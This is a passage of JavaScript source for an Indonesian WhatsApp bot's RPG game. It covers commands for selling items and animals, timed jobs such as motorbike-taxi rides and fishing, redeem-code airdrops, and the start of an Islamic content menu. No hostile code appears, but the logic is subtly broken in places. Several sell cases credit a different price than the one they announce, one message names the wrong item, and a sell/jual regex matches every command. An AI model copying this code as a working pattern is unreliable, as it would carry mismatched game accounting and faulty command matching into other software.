                      } else reply(`Cumi Kamu Tidak Cukup`.trim());
                      break;

                    case "botol":
                      if (db.data.users[m.sender].botol >= count * 1) {
                        db.data.users[m.sender].money += Sbotol * count;
                        db.data.users[m.sender].botol -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Cumi Dengan Harga ${
                            Sbotol * count
                          } Money `.trim()
                        );
                      } else reply(`Botol Kamu Tidak Cukup`.trim());
                      break;

                    case "kaleng":
                      if (db.data.users[m.sender].kaleng >= count * 1) {
                        db.data.users[m.sender].money += Skaleng * count;
                        db.data.users[m.sender].kaleng -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Kaleng Dengan Harga ${
                            Skaleng * count
                          } Money `.trim()
                        );
                      } else reply(`Kaleng Kamu Tidak Cukup`.trim());
                      break;

                    case "kardus":
                      if (db.data.users[m.sender].kardus >= count * 1) {
                        db.data.users[m.sender].money += Skardus * count;
                        db.data.users[m.sender].kardus -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Kardus Dengan Harga ${
                            Skardus * count
                          } Money `.trim()
                        );
                      } else reply(`Kardus Kamu Tidak Cukup`.trim());
                      break;

                    case "gelas":
                      if (db.data.users[m.sender].gelas >= count * 1) {
                        db.data.users[m.sender].money += Sgelas * count;
                        db.data.users[m.sender].gelas -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Gelas Dengan Harga ${
                            Sgelas * count
                          } Money `.trim()
                        );
                      } else reply(`Gelas Kamu Tidak Cukup`.trim());
                      break;

                    case "plastik":
                      if (db.data.users[m.sender].plastik >= count * 1) {
                        db.data.users[m.sender].money += Splastik * count;
                        db.data.users[m.sender].plastik -= count * 1;
                        reply(
                          `Sukses Menjual ${count} Plastik Dengan Harga ${
                            Splastik * count
                          } Money `.trim()
                        );
                      } else reply(`Plastik Kamu Tidak Cukup`.trim());
                      break;
                    default:
                      return reply(Kchat);
                  }
                  break;
                default:
                  return reply(Kchat);
              }
            } else if (/sell|jual|/i.test(command)) {
              const count =
                args[1] && args[1].length > 0
                  ? Math.min(99999999, Math.max(parseInt(args[1]), 1))
                  : !args[1] || args.length < 3
                  ? 1
                  : Math.min(1, count);
              switch (type) {
                case "banteng":
                  if (db.data.users[m.sender].banteng >= count * 1) {
                    db.data.users[m.sender].money += Spaus * count;
                    db.data.users[m.sender].banteng -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Banteng Dengan Harga ${
                        Sbanteng * count
                      } Money `.trim()
                    );
                  } else reply(`Banteng Kamu Tidak Cukup`.trim());
                  break;

                case "harimau":
                  if (db.data.users[m.sender].harimau >= count * 1) {
                    db.data.users[m.sender].money += Sharimau * count;
                    db.data.users[m.sender].harimau -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Harimau Dengan Harga ${
                        Sharimau * count
                      } Money `.trim()
                    );
                  } else reply(`Harimau Kamu Tidak Cukup`.trim());
                  break;

                case "gajah":
                  if (db.data.users[m.sender].gajah >= count * 1) {
                    db.data.users[m.sender].money += Sgajah * count;
                    db.data.users[m.sender].gajah -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Gajah Dengan Harga ${
                        Sgajah * count
                      } Money `.trim()
                    );
                  } else reply(`Gajah Kamu Tidak Cukup`.trim());
                  break;

                case "kambing":
                  if (db.data.users[m.sender].kambing >= count * 1) {
                    db.data.users[m.sender].money += Skambing * count;
                    db.data.users[m.sender].kambing -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Kambing Dengan Harga ${
                        Skambing * count
                      } Money `.trim()
                    );
                  } else reply(`Kambing Kamu Tidak Cukup`.trim());
                  break;

                case "panda":
                  if (db.data.users[m.sender].panda >= count * 1) {
                    db.data.users[m.sender].money += Spanda * count;
                    db.data.users[m.sender].panda -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Panda Dengan Harga ${
                        Sbuaya * count
                      } Money `.trim()
                    );
                  } else reply(`Panda Kamu Tidak Cukup`.trim());
                  break;

                case "buaya":
                  if (db.data.users[m.sender].buaya >= count * 1) {
                    db.data.users[m.sender].money += Sbuaya * count;
                    db.data.users[m.sender].buaya -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Buaya Dengan Harga ${
                        Sbuaya * count
                      } Money `.trim()
                    );
                  } else reply(`Buaya Kamu Tidak Cukup`.trim());
                  break;

                case "kerbau":
                  if (db.data.users[m.sender].kerbau >= count * 1) {
                    db.data.users[m.sender].money += Skerbau * count;
                    db.data.users[m.sender].kerbau -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Kerbau Dengan Harga ${
                        Skerbau * count
                      } Money `.trim()
                    );
                  } else reply(`Kerbau Kamu Tidak Cukup`.trim());
                  break;

                case "sapi":
                  if (db.data.users[m.sender].sapi >= count * 1) {
                    db.data.users[m.sender].money += Ssapi * count;
                    db.data.users[m.sender].sapi -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Sapi Dengan Harga ${
                        Ssapi * count
                      } Money `.trim()
                    );
                  } else reply(`Sapi Kamu Tidak Cukup`.trim());
                  break;

                case "monyet":
                  if (db.data.users[m.sender].monyet >= count * 1) {
                    db.data.users[m.sender].money += Smonyet * count;
                    db.data.users[m.sender].monyet -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Monyet Dengan Harga ${
                        Smonyet * count
                      } Money `.trim()
                    );
                  } else reply(`Monyet Kamu Tidak Cukup`.trim());
                  break;

                case "babi":
                  if (db.data.users[m.sender].babi >= count * 1) {
                    db.data.users[m.sender].money += Sbabi * count;
                    db.data.users[m.sender].babi -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Babi Dengan Harga ${
                        Sbabi * count
                      } Money `.trim()
                    );
                  } else reply(`Babi Kamu Tidak Cukup`.trim());
                  break;

                case "babihutan":
                  if (db.data.users[m.sender].babihutan >= count * 1) {
                    db.data.users[m.sender].money += Sbabihutan * count;
                    db.data.users[m.sender].babihutan -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Babi Hutan Dengan Harga ${
                        Sbabihutan * count
                      } Money `.trim()
                    );
                  } else reply(`Babi Hutan Kamu Tidak Cukup`.trim());
                  break;

                case "ayam":
                  if (db.data.users[m.sender].ayam >= count * 1) {
                    db.data.users[m.sender].money += Sayam * count;
                    db.data.users[m.sender].ayam -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Ayam Dengan Harga ${
                        Sayam * count
                      } Money `.trim()
                    );
                  } else reply(`Ayam Kamu Tidak Cukup`.trim());
                  break;
                //mancing
                case "kepiting":
                  if (db.data.users[m.sender].kepiting >= count * 1) {
                    db.data.users[m.sender].money += Skepiting * count;
                    db.data.users[m.sender].kepiting -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Kepiting Dengan Harga ${
                        Skepiting * count
                      } Money `.trim()
                    );
                  } else reply(`Kepiting Kamu Tidak Cukup`.trim());
                  break;

                case "ikan":
                  if (db.data.users[m.sender].ikan >= count * 1) {
                    db.data.users[m.sender].money += Skepiting * count;
                    db.data.users[m.sender].ikan -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Ikan Dengan Harga ${
                        Sikan * count
                      } Money `.trim()
                    );
                  } else reply(`Ikan Kamu Tidak Cukup`.trim());
                  break;

                case "dory":
                  if (db.data.users[m.sender].dory >= count * 1) {
                    db.data.users[m.sender].money += Sdory * count;
                    db.data.users[m.sender].dory -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Ikan Dory Dengan Harga ${
                        Sdory * count
                      } Money `.trim()
                    );
                  } else reply(`Ikan Dory Kamu Tidak Cukup`.trim());
                  break;

                case "gurita":
                  if (db.data.users[m.sender].gurita >= count * 1) {
                    db.data.users[m.sender].money += Skepiting * count;
                    db.data.users[m.sender].gurita -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Gurita Dengan Harga ${
                        Sgurita * count
                      } Money `.trim()
                    );
                  } else reply(`Gurita Kamu Tidak Cukup`.trim());
                  break;

                case "buntal":
                  if (db.data.users[m.sender].buntal >= count * 1) {
                    db.data.users[m.sender].money += Sbuntal * count;
                    db.data.users[m.sender].buntal -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${
                        Sbuntal * count
                      } Money `.trim()
                    );
                  } else reply(`Ikan Buntal Kamu Tidak Cukup`.trim());
                  break;

                case "hiu":
                  if (db.data.users[m.sender].hiu >= count * 1) {
                    db.data.users[m.sender].money += Shiu * count;
                    db.data.users[m.sender].hiu -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Hiu Dengan Harga ${
                        Shiu * count
                      } Money `.trim()
                    );
                  } else reply(`Hiu Kamu Tidak Cukup`.trim());
                  break;

                case "orca":
                  if (db.data.users[m.sender].orca >= count * 1) {
                    db.data.users[m.sender].money += Sorca * count;
                    db.data.users[m.sender].orca -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Paus Orca Dengan Harga ${
                        Sorca * count
                      } Money `.trim()
                    );
                  } else reply(`Paus Orca Kamu Tidak Cukup`.trim());
                  break;

                case "lumba":
                  if (db.data.users[m.sender].lumba >= count * 1) {
                    db.data.users[m.sender].money += Skepiting * count;
                    db.data.users[m.sender].lumba -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${
                        Slumba * count
                      } Money `.trim()
                    );
                  } else reply(`Lumba Lumba Kamu Tidak Cukup`.trim());
                  break;

                case "paus":
                  if (db.data.users[m.sender].paus >= count * 1) {
                    db.data.users[m.sender].money += Spaus * count;
                    db.data.users[m.sender].paus -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Paus Dengan Harga ${
                        Spaus * count
                      } Money `.trim()
                    );
                  } else reply(`Paus Kamu Tidak Cukup`.trim());
                  break;

                case "lobster":
                  if (db.data.users[m.sender].lobster >= count * 1) {
                    db.data.users[m.sender].money += Slobster * count;
                    db.data.users[m.sender].lobster -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Lobster Dengan Harga ${
                        Slobster * count
                      } Money `.trim()
                    );
                  } else reply(`Lobster Kamu Tidak Cukup`.trim());
                  break;
                case "udang":
                  if (db.data.users[m.sender].udang >= count * 1) {
                    db.data.users[m.sender].money += Sudang * count;
                    db.data.users[m.sender].udang -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Udang Dengan Harga ${
                        Sudang * count
                      } Money `.trim()
                    );
                  } else reply(`Udang Kamu Tidak Cukup`.trim());
                  break;

                case "cumi":
                  if (db.data.users[m.sender].cumi >= count * 1) {
                    db.data.users[m.sender].money += Scumi * count;
                    db.data.users[m.sender].cumi -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Cumi Dengan Harga ${
                        Scumi * count
                      } Money `.trim()
                    );
                  } else reply(`Cumi Kamu Tidak Cukup`.trim());
                  break;

                case "botol":
                  if (db.data.users[m.sender].botol >= count * 1) {
                    db.data.users[m.sender].money += Sbotol * count;
                    db.data.users[m.sender].botol -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Botol Dengan Harga ${
                        Sbotol * count
                      } Money `.trim()
                    );
                  } else reply(`Botol Kamu Tidak Cukup`.trim());
                  break;
                case "kaleng":
                  if (db.data.users[m.sender].kaleng >= count * 1) {
                    db.data.users[m.sender].money += Skaleng * count;
                    db.data.users[m.sender].kaleng -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Kaleng Dengan Harga ${
                        Skaleng * count
                      } Money `.trim()
                    );
                  } else reply(`Kaleng Kamu Tidak Cukup`.trim());
                  break;

                case "kardus":
                  if (db.data.users[m.sender].kardus >= count * 1) {
                    db.data.users[m.sender].money += Skardus * count;
                    db.data.users[m.sender].kardus -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Kardus Dengan Harga ${
                        Skardus * count
                      } Money `.trim()
                    );
                  } else reply(`Kardus Kamu Tidak Cukup`.trim());
                  break;
                case "gelas":
                  if (db.data.users[m.sender].gelas >= count * 1) {
                    db.data.users[m.sender].money += Sgelas * count;
                    db.data.users[m.sender].gelas -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Gelas Dengan Harga ${
                        Sgelas * count
                      } Money `.trim()
                    );
                  } else reply(`Gelas Kamu Tidak Cukup`.trim());
                  break;

                case "plastik":
                  if (db.data.users[m.sender].plastik >= count * 1) {
                    db.data.users[m.sender].money += Splastik * count;
                    db.data.users[m.sender].plastik -= count * 1;
                    reply(
                      `Sukses Menjual ${count} Plastik Dengan Harga ${
                        Splastik * count
                      } Money `.trim()
                    );
                  } else reply(`Plastik Kamu Tidak Cukup`.trim());
                  break;
                default:
                  return reply(Kchat);
              }
            }
          } catch (err) {
            console.log(util.format(err));
            let e = String(err);
            Kilianhst.sendMessage("6288286624778@s.whatsapp.net", {
              text:
                "Hello developer, there seems to be an error, please fix it " +
                util.format(e),
              contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
              },
            });
          }
        }
        break;

      case "ojek":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastmisi;
          let _timers = 3600000 - __timers;
          let order = db.data.users[m.sender].ojekk;
          let timers = clockString(_timers);
          let name = Kilianhst.getName(m.sender);
          let user = db.data.users[m.sender];
          let id = m.sender;
          let kerja = "Ojek";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            throw false;
          }
          if (new Date() - db.data.users[m.sender].lastmisi > 3600000) {
            let randomaku4 = Math.floor(Math.random() * 10);
            let randomaku5 = Math.floor(Math.random() * 10);

            let rbrb4 = randomaku4 * 100000;
            let rbrb5 = randomaku5 * 1000;

            var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🛵
✔️ Mendapatkan orderan....
`.trim();

            var dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️
➕ Mengantar ke tujuan....
`.trim();

            var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️
➕ Sampai di tujuan....
`.trim();

            var dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🚶
➕ 💹Menerima gaji....
`.trim();

            var hsl = `
*—[ Hasil Ngojek ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim();

            user.money += rbrb4;
            user.exp += rbrb5;
            user.ojekk += 1;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 27000),
            ];

            setTimeout(() => {
              reply(hsl);
            }, 27000);

            setTimeout(() => {
              reply(dimas4);
            }, 25000);

            setTimeout(() => {
              reply(dimas3);
            }, 20000);

            setTimeout(() => {
              reply(dimas2);
            }, 15000);

            setTimeout(() => {
              reply(dimas);
            }, 10000);

            setTimeout(() => {
              reply("🔍Mencari pelanggan.....");
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(
              `Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`
            );
        }
        break;

      case "maling":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function msToTime(duration) {
            var milliseconds = parseInt((duration % 1000) / 100),
              seconds = Math.floor((duration / 1000) % 60),
              minutes = Math.floor((duration / (1000 * 60)) % 60),
              hours = Math.floor((duration / (1000 * 60 * 60)) % 24);

            hours = hours < 10 ? "0" + hours : hours;
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            return hours + " jam " + minutes + " menit " + seconds + " detik";
          }
          const timeout = 604800000;

          let user = db.data.users[m.sender];
          let time = user.lastmaling + 604800000;
          if (new Date() - user.lastmaling < 604800000)
            return reply(
              `📮Anda sudah merampok bank\nTunggu selama ⏲️ ${msToTime(
                time - new Date()
              )} lagi`
            );
          let money = `${Math.floor(Math.random() * 30000)}`.trim();
          let exp = `${Math.floor(Math.random() * 999)}`.trim();
          let kardus = `${Math.floor(Math.random() * 1000)}`.trim();
          user.money += money * 1;
          user.exp += exp * 1;
          user.kardus += kardus * 1;
          user.lastmaling = new Date() * 1;
          reply(
            `Selamat kamu mendapatkan : \n💰+${money} Money\📦+${kardus} Kardus\n✨+${exp} Exp`
          );
          setTimeout(() => {
            reply(`Yuk waktunya Maling lagi 👋…`);
          }, timeout);
        }
        break;

      case "mancing":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          function clockString(ms) {
            let h = Math.floor(ms / 3600000);
            let m = Math.floor(ms / 60000) % 60;
            let s = Math.floor(ms / 1000) % 60;
            return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
          }
          let __timers = new Date() - db.data.users[m.sender].lastmisi;
          let _timers = 3600000 - __timers;
          let timers = clockString(_timers);
          let name = Kilianhst.getName(m.sender);
          let user = db.data.users[m.sender];
          let id = m.sender;
          let kerja = "Memancing";
          Kilianhst.misi = Kilianhst.misi ? Kilianhst.misi : {};
          if (id in Kilianhst.misi) {
            reply(`Selesaikan Misi ${Kilianhst.misi[id][0]} Terlebih Dahulu`);
            throw false;
          }
          if (user.umpan == 0)
            return reply("Kamu Membutuhkan Umpan 🪱 Untuk Memancing!");
          if (user.fishingrod == 0)
            return reply(
              "Kamu Harus Mempunyai Fishingrod 🎣 Terlebih Dahulu Jika Ingin Memancing"
            );
          if (new Date() - user.lastmisi > 3600000) {
            let ikan1 = Math.floor(Math.random() * 5);
            let ikan2 = Math.floor(Math.random() * 5);
            let ikan3 = Math.floor(Math.random() * 5);
            let ikan4 = Math.floor(Math.random() * 5);
            let ikan5 = Math.floor(Math.random() * 5);
            let ikan6 = Math.floor(Math.random() * 5);
            let ikan7 = Math.floor(Math.random() * 5);
            let ikan8 = Math.floor(Math.random() * 5);
            let ikan9 = Math.floor(Math.random() * 5);
            let ikan10 = Math.floor(Math.random() * 5);
            let ikan11 = Math.floor(Math.random() * 5);

            let hsl = ` 
*📮 Hasil tangkapan Mu*
${
  ikan1
    ? `
🦀 Kepiting: ${ikan1}`
    : ""
} ${
              ikan2
                ? `
🦞 Lobster: ${ikan2}`
                : ""
            } ${
              ikan3
                ? `
🦐 Udang: ${ikan3}`
                : ""
            } ${
              ikan4
                ? `
🦑 Cumi: ${ikan4}`
                : ""
            } ${
              ikan5
                ? `
🐙 Gurita: ${ikan5}`
                : ""
            } ${
              ikan6
                ? `
🐡 Buntal: ${ikan6}`
                : ""
            } ${
              ikan7
                ? `
🐠 Dory: ${ikan7}`
                : ""
            } ${
              ikan8
                ? `
🐳 Orca: ${ikan8}`
                : ""
            } ${
              ikan9
                ? `
🐬 Lumba: ${ikan9}`
                : ""
            } ${
              ikan10
                ? `
🐋 Paus: ${ikan10}`
                : ""
            } ${
              ikan11
                ? `
🦈 Hiu: ${ikan11}`
                : ""
            }
`.trim();
            user.kepiting += ikan1;
            user.lobster += ikan2;
            user.udang += ikan3;
            user.cumi += ikan4;
            user.gurita += ikan5;
            user.buntal += ikan6;
            user.dory += ikan7;
            user.orca += ikan8;
            user.lumba += ikan9;
            user.paus += ikan10;
            user.hiu += ikan11;
            user.fishingroddurability -= 10;
            user.umpan -= 1;

            Kilianhst.misi[id] = [
              kerja,
              setTimeout(() => {
                delete Kilianhst.misi[id];
              }, 20000),
            ];

            setTimeout(() => {
              reply(hsl);
            }, 20000);

            setTimeout(() => {
              reply(`Ini Dia Hasil Tangkapanmu`);
            }, 18000);

            setTimeout(() => {
              reply("Kamu Berhasil Menarik Ikan Keluar Dari Air");
            }, 15000);

            setTimeout(() => {
              reply("Kamu Menarik Kailmu");
            }, 12000);

            setTimeout(() => {
              reply("Kail Mu Di Tarik Ikan...");
            }, 9000);

            setTimeout(() => {
              reply("Kamu Sedang Memancing...");
            }, 0);
            user.lastmisi = new Date() * 1;
          } else
            reply(`Mohon Tunggu Selama ${timers} Sebelum Memulai Misi Kembali`);
        }
        break;

      case "nguli":
        {
          if (!isUserRegistered(ckusrjoin))
            return reply(
              "*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg"
            );
          if (!m.isGroup) return reply(mess.OnlyGrup);
          if (new Date() - db.data.users[m.sender].lastnguli > 86400000) {
            db.data.users[m.sender].limit += 10;
            reply("_🎉Selamat kamu mendapatkan +10 limit_");
            db.data.users[m.sender].lastnguli = new Date() * 1;
          } else reply("[💬] Anda sudah mengklaim upah nguli hari ini");
        }
        break;
      case "mysterybox":
        {
          if (!isCreator) return reply(mess.OnlyOwner); // Hanya Owner Tersayang yang bisa menjalankan
          let hadiahList = ["money", "exp", "limit", "potion"];
          let hadiah =
            hadiahList[Math.floor(Math.random() * hadiahList.length)];
          let jumlah = Math.floor(Math.random() * 5000) + 1000;
          let kode = [...Array(10)]
            .map(() => Math.random().toString(36)[2])
            .join("")
            .toUpperCase();

          global.db.data.redeem = global.db.data.redeem || {};
          global.db.data.redeem[kode] = {
            hadiah,
            jumlah,
            claimed: [],
            messageId: "", // Menyimpan ID pesan yang dikirim
          };

          let teks = `🎁 *Mystery Box Telah Dijatuhkan!*\n\nKode Redeem: *${kode}*\nHadiah: *${jumlah} ${hadiah}*\nLimit Klaim: 3 Orang\n\nReply Pesan Ini Dengan Ketik .claim Untuk Mengkaliam Hadiah!!!`;
          let image = {
            url: "https://img12.pixhost.to/images/1565/586300176_6726.jpg",
          };

          let grup = Object.keys(await Kilianhst.groupFetchAllParticipating());
          for (let id of grup) {
            let sentMessage = await Kilianhst.sendMessage(id, {
              image,
              caption: teks,
              footer: `Mystery Box Rpg By HuTao`,
            });

            // Simpan ID pesan yang dikirim
            global.db.data.redeem[kode].messageId = sentMessage.key.id;
          }

          reply(
            `Mystery Box Berhasil Dijatuhkan Ke ${grup.length} Grup Dengan Kode: ${kode}`
          );
        }
        break;

      case "claim":
        {
          if (!text) return reply("Mana Pesannya?");
          let kode = text.split(" ")[1];
          if (!global.db.data.redeem[kode])
            return reply("Kode Redeem Tidak Ditemukan atau Sudah Terklaim!");

          let redeem = global.db.data.redeem[kode];

          // Cek apakah yang membalas adalah pesan Mystery Box yang dikirimkan sebelumnya
          if (m.message.key.id !== redeem.messageId)
            return reply("Balas pesan yang berisi Mystery Box untuk klaim!");

          if (redeem.claimed.includes(m.sender))
            return reply("Kamu Sudah Mengklaim Kode Ini!");
          if (redeem.claimed.length >= 3)
            return reply("Limit Klaim Kode Ini Sudah Penuh!");

          // Klaim hadiah
          if (redeem.hadiah === "money") {
            global.db.data.users[m.sender].money += redeem.jumlah;
          } else if (redeem.hadiah === "exp") {
            global.db.data.users[m.sender].exp += redeem.jumlah;
          } else if (redeem.hadiah === "limit") {
            global.db.data.users[m.sender].limit += redeem.jumlah;
          } else if (redeem.hadiah === "potion") {
            global.db.data.users[m.sender].potion += redeem.jumlah;
          }

          // Tandai kode sebagai klaim
          redeem.claimed.push(m.sender);

          reply(
            `Kamu Telah Berhasil Klaim Hadiah: *${redeem.jumlah} ${redeem.hadiah}* dari Kode Redeem: *${kode}*`
          );

          // Hapus kode redeem setelah diklaim
          delete global.db.data.redeem[kode];
        }
        break;

      case "jatuhkandrop":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          let hadiahList = ["money", "exp", "limit", "potion"];
          let hadiah =
            hadiahList[Math.floor(Math.random() * hadiahList.length)];
          let jumlah = Math.floor(Math.random() * 5000) + 1000;
          let kode = [...Array(10)]
            .map(() => Math.random().toString(36)[2])
            .join("")
            .toUpperCase();

          global.db.data.redeem = global.db.data.redeem || {};
          global.db.data.redeem[kode] = {
            hadiah,
            jumlah,
            claimed: [],
          };

          let teks = `🎁 *Airdrop Telah Dijatuhkan!*\n\nKode Redeem: *${kode}*\nHadiah: *${jumlah} ${hadiah}*\nLimit Klaim: 3 Orang\n\nKlik tombol dibawah untuk klaim!`;
          let image = {
            url: "https://img12.pixhost.to/images/1521/585467407_6726.jpg",
          };

          let grup = Object.keys(await Kilianhst.groupFetchAllParticipating());
          for (let id of grup) {
            await Kilianhst.sendMessage(id, {
              image,
              caption: teks,
              buttons: [
                {
                  buttonId: `.redeem ${kode}`,
                  buttonText: { displayText: "Klaim Sekarang" },
                  type: 1,
                },
              ],
              footer: `Aidrop Rpg By HuTao`,
            });
          }

          reply(
            `Airdrop Berhasil Dijatuhkan Ke ${grup.length} Grup Dengan Kode: ${kode}`
          );
        }
        break;

      case "redeem":
        {
          if (!text) return reply("Mana Kode Redeem Nya");

          global.db.data.redeem = global.db.data.redeem || {};
          let data = global.db.data.redeem[text.toUpperCase()];
          if (!data) return reply("Kode Redeem Tidak Valid");

          if (data.claimed.includes(m.sender))
            return reply("Kamu Sudah Klaim Kode Ini!");
          if (data.claimed.length >= 3) {
            delete global.db.data.redeem[text.toUpperCase()];
            return reply("Kode Redeem Sudah Mencapai Batas Klaim (3 Orang)");
          }

          data.claimed.push(m.sender);
          let hadiah = data.hadiah;
          let jumlah = data.jumlah;
          let user = db.data.users[m.sender];

          switch (hadiah) {
            case "money":
              user.money += jumlah;
              break;
            case "exp":
              user.exp += jumlah;
              break;
            case "limit":
              user.limit += jumlah;
              break;
            case "potion":
              user.potion += jumlah;
              break;
          }

          reply(`Berhasil Klaim Kode Redeem!\n+${jumlah} ${hadiah}`);

          if (data.claimed.length >= 3)
            delete global.db.data.redeem[text.toUpperCase()];
        }
        break;
      case "listredeem":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          global.db.data.redeem = global.db.data.redeem || {};
          let data = global.db.data.redeem;

          let teks = "*List Kode Redeem Yang Masih Aktif:*\n\n";
          let kode = Object.entries(data);
          if (!kode.length) return reply("Tidak Ada Kode Redeem Aktif.");

          for (let [key, val] of kode) {
            teks += `• *Kode:* ${key}\n`;
            teks += `• Hadiah: ${val.hadiah} +${val.jumlah}\n`;
            teks += `• Diklaim: ${val.claimed.length}/3\n\n`;
          }

          reply(teks.trim());
        }
        break;
      case "hapusredeem":
        {
          if (!isCreator) return reply(mess.OnlyOwner);
          if (!text) return reply("Ketik .hapusredeem <kode>");
          global.db.data.redeem = global.db.data.redeem || {};
          const data = global.db.data.redeem;
          let code = text.trim().toUpperCase();
          if (!data[code]) return reply("Kode Tidak Ditemukan.");
          delete data[code];
          reply(`Berhasil Menghapus Kode: ${code}`);
        }
        break;

      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗥𝗣𝗚 𝗠𝗘𝗡𝗨
𝗕𝗬 KIL
HUTAO AI
*/

      //============================================================\\
      // 𝗜 𝗦 𝗟 𝗔 𝗠 𝗜       -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "kisahnabi":
        {
          if (!text)
            return reply(
              `Ketik nama Nabi\nContoh : ${prefix + command} Muhammad`
            );
          try {
            let tod = await fetchJson(
              `https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`
            ); //perlu ganti
            const name = tod.name;
            if (name === "Error") return m.reply("Ketik Nama Yang Valid");
            const ultah = tod.thn_kelahiran;
            const umur = tod.usia;
            const asal = tod.tmp;
            const cerita = tod.description;
            var kisah = `_*Kisah Nabi*_
Nama Nabi : ${name}
Hari Kelahiran : ${ultah}
Umur : ${umur}
Asal : ${asal}

Kisah Nabi *${name}* :
${cerita}`;
            m.reply(kisah);
          } catch (error) {
            console.log(error);
            m.reply(
              `Ketik Nama Nabi Yang Valid\n*Contoh* : ${prefix + command} adam`
            );
          }
        }
        break;
      case "asmaulhusna":
        {
          const asmaulhusna = [
            {
              index: 1,
              latin: "Ar Rahman",
              arabic: "الرَّحْمَنُ",
              translation_id: "Yang Memiliki Mutlak sifat Pemurah",
              translation_en: "The All Beneficent",
            },
            {
              index: 2,
              latin: "Ar Rahiim",
              arabic: "الرَّحِيمُ",
              translation_id: "Yang Memiliki Mutlak sifat Penyayang",
              translation_en: "The Most Merciful",
            },
            {
              index: 3,
              latin: "Al Malik",
              arabic: "الْمَلِكُ",
              translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
              translation_en: "The King, The Sovereign",
            },
            {
              index: 4,
              latin: "Al Quddus",
              arabic: "الْقُدُّوسُ",
